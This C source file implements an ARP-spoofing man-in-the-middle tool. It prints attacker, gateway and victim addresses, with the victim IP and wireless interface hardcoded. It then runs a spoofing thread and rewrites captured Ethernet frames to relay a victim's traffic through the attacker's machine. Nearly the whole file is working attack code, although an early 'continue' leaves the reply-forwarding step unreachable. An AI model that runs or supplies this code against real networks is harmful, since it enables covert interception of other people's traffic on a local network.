#include "core.h"
#include <pthread.h>
#include <signal.h>

static u8 MESSAGE_BUFFER[1 << 10];
static u8 BYTES_BUFFER[1 << 16];
int ARP_SOCK = -1;
int RAW_SOCK = -1;
int IS_TERMINATED = 0;
pthread_t ARP_SPOOF_TID = -1;
ARPSpoofArgs ARP_SPOOF_ARGS = {0};

void sigint_handler(int sig) {
    ARP_SPOOF_ARGS.is_terminated = 1;
    IS_TERMINATED = 1;
}

void main(void) {
    signal(SIGINT, sigint_handler);

    ARP_SOCK = get_arp_socket();

    char* if_name = "wlp1s0";
    u32 victim_addr_hl = inet_addr("192.168.0.101");

    printf("------------------------------------\n");
    printf("Attacker ip:      ");
    u32 attacker_addr_hl = get_interface_addr_hl(if_name);
    print_addr_l(attacker_addr_hl);
    printf("\n");

    Mac attacker_mac = get_interface_mac(if_name);
    printf("Attacker mac:     ");
    print_mac(attacker_mac);
    printf("\n");

    printf("------------------------------------\n");
    printf("Gateway ip:       ");
    u32 gateway_addr_hl = get_gateway_addr_hl(if_name);
    print_addr_l(gateway_addr_hl);
    printf("\n");

    printf("Gateway mac:      ");
    Mac gateway_mac = {0};
    if (request_target_mac(
            ARP_SOCK, if_name, &gateway_mac, gateway_addr_hl, 1, 5
        )) {
        print_mac(gateway_mac);
    } else {
        printf("ERROR: Can't obtain mac\n");
        exit(1);
    }
    printf("\n");

    printf("------------------------------------\n");
    printf("Victim ip:        ");
    print_addr_l(victim_addr_hl);
    printf("\n");

    printf("Victim mac:       ");
    Mac victim_mac = {0};
    if (request_target_mac(
            ARP_SOCK, if_name, &victim_mac, victim_addr_hl, 5, 1
        )) {
        print_mac(victim_mac);
    } else {
        printf("ERROR: Can't obtain mac\n");
        exit(1);
    }
    printf("\n");

    ARP_SPOOF_ARGS.arp_sock = ARP_SOCK;
    ARP_SPOOF_ARGS.if_name = if_name;
    ARP_SPOOF_ARGS.attacker_mac = attacker_mac;
    ARP_SPOOF_ARGS.gateway_addr_hl = gateway_addr_hl;
    ARP_SPOOF_ARGS.victim_macs = &victim_mac;
    ARP_SPOOF_ARGS.victim_addrs_hl = &victim_addr_hl;
    ARP_SPOOF_ARGS.n_victims = 1;
    ARP_SPOOF_ARGS.period_sec = 1;
    ARP_SPOOF_ARGS.is_terminated = 0;

    if (pthread_create(
            &ARP_SPOOF_TID, NULL, start_arp_spoof, (void*)&ARP_SPOOF_ARGS
        )
        != 0) {
        fprintf(
            stderr, "ERROR: Failed to create start_arp_spoof thread\n"
        );
        exit(1);
    }

    printf("------------------------------------\n");
    printf("Spoofing...\n");
    RAW_SOCK = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (RAW_SOCK == -1) {
        perror("socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))");
        exit(1);
    }

    sockaddr_ll addr_ll = {0};
    addr_ll.sll_family = AF_PACKET;
    addr_ll.sll_ifindex = if_nametoindex(if_name);
    if (bind(RAW_SOCK, (sockaddr*)&addr_ll, sizeof(addr_ll)) == -1) {
        perror("bind(RAW_SOCK, ...)");
        exit(1);
    }

    do {
        // Wait for an incoming packet
        int packet_size = recv(
            RAW_SOCK, BYTES_BUFFER, sizeof(BYTES_BUFFER), 0
        );
        if (packet_size == -1) {
            perror("recv(RAW_SOCK, ...)");
            continue;
        }

        struct ether_header* eth_header = (struct ether_header*)
            BYTES_BUFFER;

        // Check if the packet is for the target machine
        if (memcmp(
                eth_header->ether_dhost, attacker_mac.bytes, ETHER_ADDR_LEN
            )
            != 0) {
            continue;
        }

        // Modify the packet's destination MAC address to the router's MAC
        // address
        memcpy(eth_header->ether_dhost, gateway_mac.bytes, ETHER_ADDR_LEN);

        // Modify the packet's source MAC address to the proxy's MAC
        // address
        memcpy(
            eth_header->ether_shost, attacker_mac.bytes, ETHER_ADDR_LEN
        );

        // Send the modified packet to the router
        if (send(RAW_SOCK, BYTES_BUFFER, packet_size, 0) == -1) {
            sprintf(
                MESSAGE_BUFFER,
                "Can't send(RAW_SOCK, ...), packet size: %d",
                packet_size
            );
            perror(MESSAGE_BUFFER);
            continue;
        }

        // Wait for the router's response
        packet_size = recv(
            RAW_SOCK, BYTES_BUFFER, sizeof(BYTES_BUFFER), 0
        );
        if (packet_size == -1) {
            perror("recv(RAW_SOCK, ...)");
            continue;
        }

        printf("receive packet from router\n");
        continue;

        // Modify the response's source MAC address to the target machine's
        // MAC address
        memcpy(
            eth_header->ether_shost,
            eth_header->ether_dhost,
            ETHER_ADDR_LEN
        );
        memcpy(eth_header->ether_dhost, victim_mac.bytes, ETHER_ADDR_LEN);
        // memcpy(eth_header->ether_dhost, attacker_mac.bytes,
        // ETHER_ADDR_LEN);

        // Send the modified response back to the target machine
        if (send(RAW_SOCK, BYTES_BUFFER, packet_size, 0) == -1) {
            sprintf(
                MESSAGE_BUFFER,
                "Can't send(RAW_SOCK, ...), packet size: %d",
                packet_size
            );
            continue;
        }

        printf("STEP!\n");
    } while (IS_TERMINATED == 0);

    pthread_join(ARP_SPOOF_TID, NULL);
    close(ARP_SOCK);
    close(RAW_SOCK);
    exit(0);
}
